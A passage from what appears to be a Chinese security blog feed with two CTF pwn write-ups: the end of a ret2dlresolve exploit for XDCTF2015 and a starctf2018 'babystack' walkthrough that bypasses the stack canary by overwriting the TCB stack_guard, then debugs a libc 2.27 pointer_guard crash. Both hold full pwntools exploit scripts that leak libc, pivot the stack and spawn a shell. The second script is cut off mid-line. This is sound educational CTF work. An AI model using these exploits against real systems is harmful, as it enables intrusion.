ebx, DWORD PTR [edx+0x4]</span><br></pre></td></tr></table></figure><p>当前<code>eax+0x170</code>中保存的地址是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;wx $eax+0x170</span><br><span class="line">0xf7fb4ab0:0xf7f873f0       </span><br></pre></td></tr></table></figure><p>第二句汇编执行完成后，<code>edx</code>的值如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$edx   : 0xf7fcb6b0</span><br></pre></td></tr></table></figure><p>此时内存布局是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[ Legend:  Code | Heap | Stack ]</span><br><span class="line">Start      End        Offset     Perm Path</span><br><span class="line">0x08048000 0x08049000 0x00000000 r-x &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x08049000 0x0804a000 0x00000000 r-- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0x0804a000 0x0804b000 0x00001000 rw- &#x2F;home&#x2F;ph4ntom&#x2F;binary&#x2F;linux&#x2F;stackoverflow&#x2F;ret2dlresolve&#x2F;bof</span><br><span class="line">0xf7d92000 0xf7f67000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f67000 0xf7f68000 0x001d5000 --- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f68000 0xf7f6a000 0x001d5000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6a000 0xf7f6b000 0x001d7000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7f6b000 0xf7f6e000 0x00000000 rw- </span><br><span class="line">0xf7f87000 0xf7f89000 0x00000000 rw- </span><br><span class="line">0xf7f89000 0xf7f8c000 0x00000000 r-- [vvar]</span><br><span class="line">0xf7f8c000 0xf7f8d000 0x00000000 r-x [vdso]</span><br><span class="line">0xf7f8d000 0xf7fb3000 0x00000000 r-x &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 0x00025000 r-- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb5000 0x00026000 rw- &#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xffa55000 0xffa76000 0x00000000 rw- [stack]</span><br></pre></td></tr></table></figure><p>可以看到此时<code>edx</code>的值已经处在了无法访问的内存区域，故而当执行到第三句汇编时，程序就会崩溃</p><p>综上所述，我们可以知道，我们选择的<code>.bss</code>节的初始偏移的大小应当严格控制，必须使偏移的大小能够让如下语句中的<code>edx+esi*2</code>落在规定的区间内，否则就会导致错误(当然，如果没有落在规定区间内，也有几率成功，因为基于上面<code>edx+esi*2</code>所指向的部分内存空间,我们可以看到存在一些双字节数据为<code>0x0000</code>,当<code>edx+esi*2</code>指向的数据为这些特殊位置时，也可以成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf7f45fda &lt;_dl_fixup+106&gt;  movzx  edx, WORD PTR [edx+esi*2]</span><br></pre></td></tr></table></figure><p>我们也可以通过计算，得出<code>.bss</code>至少应当被抬高的偏移值</p><p>由于<code>edx+esi*2</code>与<code>.gnu.version</code>节的起始地址之间最小的距离应当为<code>0x80487db-0x80482d8=0x503</code></p><p>所以此时<code>esi</code>应当为<code>0x503/0x2=0x282</code>(向上取整)</p><p>也就是说，我们伪造的<code>reloc-&gt;r_info</code>最小值应当为<code>0x282</code></p><p>反推最小抬高距离(在我的payload情况下),<code>0x80481cc</code>+<code>0x10</code>*<code>0x282</code>-<code>0x804a000</code>-<code>0x50</code>=<code>0x99c</code></p><p>其中<code>0x80481cc</code>为<code>.dynsym</code>节的起始地址，<code>0x804a000</code>为<code>.bss</code>节的起始地址,<code>0x50</code>为已构造的payload的长度</p><p>附上我的最终payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">elf &#x3D; ELF(&#39;bof&#39;)</span><br><span class="line">r &#x3D; process(&#39;.&#x2F;bof&#39;)</span><br><span class="line">rop &#x3D; ROP(&#39;.&#x2F;bof&#39;)</span><br><span class="line"></span><br><span class="line">offset &#x3D; 112</span><br><span class="line">bss_addr &#x3D; elf.bss()</span><br><span class="line"></span><br><span class="line">readplt &#x3D; elf.plt[&#39;read&#39;]</span><br><span class="line">writeplt &#x3D; elf.plt[&#39;write&#39;]</span><br><span class="line"></span><br><span class="line">r.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)</span><br><span class="line"></span><br><span class="line">## stack pivoting to bss segment</span><br><span class="line">stack_size &#x3D; 0x99c</span><br><span class="line">base_stage &#x3D; bss_addr + stack_size</span><br><span class="line">### padding</span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * offset</span><br><span class="line">payload +&#x3D; p32(readplt)</span><br><span class="line">payload +&#x3D; p32(0x08048649) #pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(100)</span><br><span class="line">payload +&#x3D; p32(0x0804864b) #pop ebp ; ret</span><br><span class="line">payload +&#x3D; p32(base_stage)</span><br><span class="line">payload +&#x3D; p32(0x08048465)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh &#x3D; &quot;&#x2F;bin&#x2F;sh&quot;</span><br><span class="line">plt0 &#x3D; elf.get_section_by_name(&#39;.plt&#39;).header.sh_addr</span><br><span class="line">rel_plt &#x3D; elf.get_section_by_name(&#39;.rel.plt&#39;).header.sh_addr</span><br><span class="line">dynsym &#x3D; elf.get_section_by_name(&#39;.dynsym&#39;).header.sh_addr</span><br><span class="line">dynstr &#x3D; elf.get_section_by_name(&#39;.dynstr&#39;).header.sh_addr</span><br><span class="line"># got</span><br><span class="line">fake_index &#x3D; base_stage + 20 - rel_plt</span><br><span class="line">write_got &#x3D; elf.got[&#39;write&#39;]</span><br><span class="line"># info</span><br><span class="line">fake_sym_addr &#x3D; base_stage + 28</span><br><span class="line">align &#x3D; 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span><br><span class="line">fake_sym_addr &#x3D; fake_sym_addr+align</span><br><span class="line">fake_sym_offset &#x3D; (fake_sym_addr - dynsym)&#x2F;0x10</span><br><span class="line">r_info &#x3D; (fake_sym_offset &lt;&lt; 8) | 0x7</span><br><span class="line">fake_func_str_addr &#x3D; fake_sym_addr+0x10-dynstr</span><br><span class="line">fake_write_sym &#x3D; p32(fake_func_str_addr)+p32(0)+p32(0)+p32(0x12)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;&#39;</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">payload +&#x3D; p32(plt0)</span><br><span class="line">payload +&#x3D; p32(fake_index)</span><br><span class="line">payload +&#x3D; p32(0xdeadbeef)</span><br><span class="line">#payload +&#x3D; p32(1)</span><br><span class="line">payload +&#x3D; p32(base_stage+80)</span><br><span class="line">#payload +&#x3D; p32(len(sh))</span><br><span class="line">payload +&#x3D; p32(write_got)</span><br><span class="line">payload +&#x3D; p32(r_info)</span><br><span class="line">payload +&#x3D; &#39;a&#39; *align</span><br><span class="line">payload +&#x3D; p32(fake_func_str_addr)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(0)</span><br><span class="line">payload +&#x3D; p32(0x12)</span><br><span class="line">payload +&#x3D; &quot;system\x00&quot;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (80-len(payload))</span><br><span class="line">payload +&#x3D; sh +&#39;\x00&#39;</span><br><span class="line">payload +&#x3D; &#39;a&#39; * (100- len(payload))</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/image/ret2dl/success.png" alt="success"></p>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> binary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>bypass Canary</title>
      <link href="bypass-Canary.html"/>
      <url>bypass-Canary.html</url>
      
        <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p>这道题是来自starctf2018的一道pwn题，主要是通过覆盖TCB结构体中的stack_guard值来bypass Canary的校验过程</p><p>赛题链接:  <a href="https://github.com/sixstars/starctf2018/tree/master/pwn-babystack">https://github.com/sixstars/starctf2018/tree/master/pwn-babystack</a></p><p>TCB介绍: <a href="http://www.openwall.com/lists/oss-security/2018/02/27/5">http://www.openwall.com/lists/oss-security/2018/02/27/5</a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Ubuntu 18.04</li><li>libc-2.27</li></ul><h1 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h1><p>由于大致了解解题细节，所以我就直接拿现成的exp来先运行试一下，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;INFO&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    #debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 8300</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39;*0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc </span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read </span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">   # Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    </span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recvline().strip()[-6:].ljust(8, &#39;\0&#39;)</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    libc.address &#x3D; leak - libc.sym[&#39;puts&#39;]</span><br><span class="line">    info(&quot;%#x&quot;, libc.address)</span><br><span class="line">    bin_sh &#x3D; libc.search(&#39;&#x2F;bin&#x2F;sh&#39;).next()</span><br><span class="line">    system &#x3D; libc.sym[&#39;system&#39;]</span><br><span class="line">    </span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(bin_sh)</span><br><span class="line">    payload +&#x3D; p64(system)</span><br><span class="line"></span><br><span class="line">    p.send(payload)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    if len(sys.argv) &#x3D;&#x3D; 1:</span><br><span class="line">        global p</span><br><span class="line">        p &#x3D; process(executable&#x3D;bin_path, argv&#x3D;[bin_path]) #, env&#x3D;&#123;&#39;LD_PRELOAD&#39;:libc_path&#125;)</span><br><span class="line">    else:</span><br><span class="line">        p &#x3D; remote(sys.argv[1], int(sys.argv[2]))</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure><p>这里我没有使用官方的libc(主要是我没找到。。)，直接使用了系统的libc</p><p>主要的过程在注释里写的差不多了，大致上就是</p><ul><li>计算偏移，先填充0x1010个“A”至rbp(这一步同时覆盖了栈上的Canary为“AAAA”)</li><li>stack pivot劫持rbp至.bss段</li><li>由于libc默认PIE，所以需要调用puts函数leak出puts函数在got表的绝对地址</li><li>寻找pop_rsi_pop、pop_rdi等一系列gadget，控制寄存器，准备调用read函数的参数</li><li>根据puts leak出的puts函数在got表的绝对地址，计算偏移得到libc的基地址，并基于libc的基地址算出read函数的绝对地址</li><li>构造ROP，用“A”填充ROP至8300个字节(这一步同时利用超长的“A”，覆盖了TCB中的stack_guard值为“AAAA”，从而绕过Canary的校验)</li><li>将ROP填入栈上对应位置</li><li>在我们填入的read函数被调用时，将真正的exp通过read函数写入.bss上被劫持的栈</li><li>最后leave，将栈完全劫持到.bss段执行</li></ul><p>过程还是比较明了的，于是我运行了一下</p><p>然而，这个exp在我的机器上并不能成功的getshell，但是，在ubuntu 16.04上却可以成功getshell。</p><p>疑惑.jpg，话不多说，gdb搞起</p><h1 id="WHY"><a href="#WHY" class="headerlink" title="WHY?"></a>WHY?</h1><p>gdb单步调试至我们最终执行的payload处</p><p>首先，可以看到程序确实被劫持到了system函数，并且rdi确实指向了“/bin/sh”字符串</p><p><img src="/image/bypass-Canary/enter_system.png" alt="enter_system"></p><p>看上去一切正常，继续跟进去看看</p><p>当我调试到这一步时，程序崩溃了</p><p><img src="/image/bypass-Canary/rax_gg.png" alt="rax_gg"></p><p>可以看到，<code>&lt;do_system+359&gt; call rax</code>尝试调用rax寄存器所指向的函数</p><p>但仔细看一下rax的值，可以发现为0x74e75a79b3d1d1ee，远远超出了可以访问的内存地址空间</p><p>所以自然而然的，程序在此崩溃</p><p>那么为什么会出现这么异常的rax值呢？</p><p>我把目光放在了前面的一段汇编代码上，即<code>&lt;do_system+343&gt; xor rax, QWORD PTR fs:0x30</code> </p><p>我将<code>0x74e75a79b3d1d1ee</code>与xor之前的rax的值<code>0x35a61b38f29090af</code>进行xor，得到了<code>fs:0x30</code>的值为<code>0x4141414141414141</code></p><p>看到这，可能有人还是不理解，这里贴一下TCB的结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;                &#x2F;* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                           thread descriptor used by libpthread.  *&#x2F;</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;                &#x2F;* Pointer to the thread descriptor.  *&#x2F;</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  int gscope_flag;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  uintptr_t pointer_guard;</span><br><span class="line">  unsigned long int vgetcpu_cache[2];</span><br><span class="line">  &#x2F;* Bit 0: X86_FEATURE_1_IBT.</span><br><span class="line">     Bit 1: X86_FEATURE_1_SHSTK.</span><br><span class="line">   *&#x2F;</span><br><span class="line">  unsigned int feature_1;</span><br><span class="line">  int __glibc_unused1;</span><br><span class="line">  &#x2F;* Reservation of some values for the TM ABI.  *&#x2F;</span><br><span class="line">  void *__private_tm[4];</span><br><span class="line">  &#x2F;* GCC split stack support.  *&#x2F;</span><br><span class="line">  void *__private_ss;</span><br><span class="line">  &#x2F;* The lowest address of shadow stack,  *&#x2F;</span><br><span class="line">  unsigned long long int ssp_base;</span><br><span class="line">  &#x2F;* Must be kept even if it is no longer used by glibc since programs,</span><br><span class="line">     like AddressSanitizer, depend on the size of tcbhead_t.  *&#x2F;</span><br><span class="line">  __128bits __glibc_unused2[8][4] __attribute__ ((aligned (32)));</span><br><span class="line">  void *__padding[8];</span><br><span class="line">&#125; tcbhead_t;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>看到这儿想必大家也知道了原因，由于<code>fs:0x28</code>处就是stack_guard，而原payload在没有计算任何偏移的情况下暴力覆盖了8300个字节，在覆盖stack_guard的同时也将<code>fs:0x30</code>处的pointer_guard覆盖为了<code>0x4141414141414141</code>而在libc2.27中的system函数在实现过程中需要利用这个值做指针的校验，于是便触发了崩溃。</p><p>那要解决这个问题其实很简单，我们可以看到，<code>stack_guard</code>在相对于<code>pointer_guard</code>的低位，所以我们只需要精确计算出需要覆盖的偏移量，仅覆盖至<code>stack_guard</code>即可</p><p>通过命令<code>x/32gx pthread_self()</code>我查看到了TCB的结构以及其地址，确定了<code>stack_guard</code>与溢出点<code>buf</code>之间的偏移</p><p>TIPS：在gdb中，你是无法直接查看到fs寄存器指向的地址的，因为其引用的TCB结构只有当前线程才可以访问，所以要借助<code>x/32gx pthread_self()</code>来访问，而各类gdb插件所显示的fs都是0x0，是不正确的</p><p>此时修改exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os &#x3D; &#39;linux&#39;</span><br><span class="line">#context.terminal &#x3D; [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]</span><br><span class="line"># [&#39;CRITICAL&#39;, &#39;DEBUG&#39;, &#39;ERROR&#39;, &#39;INFO&#39;, &#39;NOTSET&#39;, &#39;WARN&#39;, &#39;WARNING&#39;]</span><br><span class="line">context.log_level &#x3D; &#39;DEBUG&#39;</span><br><span class="line"></span><br><span class="line">libc_path &#x3D; &#39;&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6&#39;</span><br><span class="line">bin_path &#x3D; &#39;.&#x2F;bs&#39;</span><br><span class="line"></span><br><span class="line">libc &#x3D; ELF(libc_path)</span><br><span class="line">binary &#x3D; ELF(bin_path)</span><br><span class="line"></span><br><span class="line">host &#x3D; &#39;&#39;</span><br><span class="line">port &#x3D; 6666</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def debug(command&#x3D;&#39;&#39;):</span><br><span class="line">    gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exploit():</span><br><span class="line">    # debug(&#39;b *0x4009E7\n&#39;)</span><br><span class="line">    g &#x3D; lambda x: next(binary.search(asm(x, os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;)))</span><br><span class="line">    pop_rdi &#x3D; g(&#39;pop rdi; ret&#39;)</span><br><span class="line">    pop_rsi_pop &#x3D; g(&#39;pop rsi; pop r15; ret&#39;)</span><br><span class="line">    leave &#x3D; g(&#39;leave; ret&#39;)</span><br><span class="line">    </span><br><span class="line">    log.info(&quot;pop_rdi:     &quot; + hex(pop_rdi))</span><br><span class="line">    log.info(&quot;pop_rsi_pop: &quot; + hex(pop_rsi_pop))</span><br><span class="line">    log.info(&quot;leave:       &quot; + hex(leave))</span><br><span class="line"></span><br><span class="line">    size &#x3D; 0x1850</span><br><span class="line">    p.sendlineafter(&#39;send?\n&#39;, str(size))</span><br><span class="line"></span><br><span class="line">    fakebuf &#x3D; 0x602f00</span><br><span class="line">    payload &#x3D; &#39;&#39;</span><br><span class="line">    payload +&#x3D; &#39;A&#39; * 0x1010</span><br><span class="line">    # stack pivot #step 1</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    # ROP1 - leak libc</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(binary.got[&#39;puts&#39;])</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;puts&#39;])</span><br><span class="line">    # ROP2 - read</span><br><span class="line">    payload +&#x3D; p64(pop_rdi)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(pop_rsi_pop)</span><br><span class="line">    payload +&#x3D; p64(fakebuf)</span><br><span class="line">    payload +&#x3D; p64(0)</span><br><span class="line">    payload +&#x3D; p64(binary.plt[&#39;read&#39;])</span><br><span class="line">    # stack pivot #step 2</span><br><span class="line">    payload +&#x3D; p64(leave)</span><br><span class="line">    # Override TCB Canary</span><br><span class="line">    payload &#x3D; payload.ljust(size, &#39;A&#39;)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    #print(&quot;pid &quot; + str(proc.pidof(p)))</span><br><span class="line">    #raw_input(&quot;attach me&quot;)</span><br><span class="line">    p.recvuntil(&#39;goodbye.\n&#39;)</span><br><span class="line">    leak &#x3D; p.recv(6)+&#39;\x00\x00&#39;</span><br><span class="line">    leak &#x3D; u64(leak)</span><br><span class="line">    #info(&quot;libc.address is %#x&quot;, libc.address)</span><br><span class="line">    #print(&quot;leak:&quot;, leak)</span><br><span class="line">    #print(&quot;sym:&quot;, 